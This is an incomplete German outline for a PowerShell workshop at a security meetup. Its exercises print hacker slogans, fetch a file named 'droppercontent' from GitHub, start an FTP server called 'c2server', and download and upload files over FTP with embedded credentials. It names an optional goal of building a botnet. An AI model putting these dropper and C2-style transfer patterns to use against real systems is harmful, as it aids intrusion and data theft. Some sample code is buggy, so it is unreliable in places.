# Motivation
 
 Ziel: Workshop Powershell
 
 Rahmen: Security Meetup öffentliche Veranstaltung
 Publikum: Pentester, Admins, Entwickler
 
 (Optionales Ziel: Botnetz entwickeln)
 
# Ablauf
 
 Wie findet man sich zurecht in Powershell wenn man von Linux kommt
 
 Theorie-Praxis-Theorie-Praxis...
 
# Powershell zum Laufen bekommen
 
 Linux: snap
 Windows: vorinstalliert
 
# Hello World
 
## Übungsbeschreibung
 
 Gib "Ich bin der L77t H4x0r" auf dem Bildschirm aus
 
## Hilfe
 Get-Help, alias
 
## Lösung 

```
 echo "Ich bin der L77t H4x0r"
```
`
# Datei zwischenspeichern
 
## Übungsbeschreibung
 
 Schreibe "I was here, I pwnd your system, muahaha" in eine Datei info.txt
 
## Hilfe
 Nutze Google "Write string to file powershell"

## Lösung

```
"I was here, I pwnd your system, muahaha" | Out-File .\info.txt
```

# Datei auslesen 
 
## Übungsbeschreibung
 
 Lies die Datei info.txt aus und gib sie auf dem Bildschirm aus
 
## Lösung

x nachzupflegen

# Datei herunterladen

## Übungsbeschreibung

Lade folgende Datei über powershell herunter
https://raw.githubusercontent.com/secf00tprint/powershellworkshop/main/droppercontent

## Hilfe
Recherchiere zu der System.Net.WebClient Klasse

## Lösung 

x nachzupflegen

# Datei über ftp herunterladen

## Übungsbeschreibung

https://hub.docker.com/r/garethflowers/ftp-server
fahre folgenden ftp server hoch mit folgendem Befehl.

```
docker run \
	--name c2server \
	--detach \
	--env FTP_USER=c2cmdgod \
	--env FTP_PASS=c2cmdgod \
	--network host \
	--volume /data:/home/user \
	garethflowers/ftp-server
```

## Hilfe
Schaue dir die System.Net.WebClient Klasse in bezug auf ftp an

## Beispiellösungen 

```
$file = "C:\test.txt"
$ftpuri = "ftp://test:123qwe@192.168.2.222/test.txt"
$webclient = New-Object System.Net.WebClient
$uri = New-Object System.Uri($ftpuri)
$webclient.DownloadFile($uri, $file)

$file = "C:\test.txt"
$password="test"
$user="123qwe"
$ftpuri = "ftp://"+ $user +":"+ $password + "@192.168.2.222/test.txt"
$webclient = New-Object System.Net.WebClient
$uri = New-Object System.Uri($ftpuri)
$webclient.DownloadFile($uri, $file)
```

# Datei über ftp hochladen

## Übungsbeschreibung 
Lade über das ftp protokoll folgende Datei vom beigelieferten vsftp server hoch:

## Hilfe
Ähnliches vorgehen wie in vorangegangener Aufgabe.

## Beispiellösung

```
$file = "C:\test.txt"
$password"test"
$user="123qwe"
$ftpuri = "ftp://"+ $user +":"+ $password + "@192.168.2.222/test.txt"
$webclient = New-Object System.Net.WebClient
$uri = New-Object System.Uri($ftpuri)
$webclient.UploadFile($uri, $file)
```

# timing Aufgaben


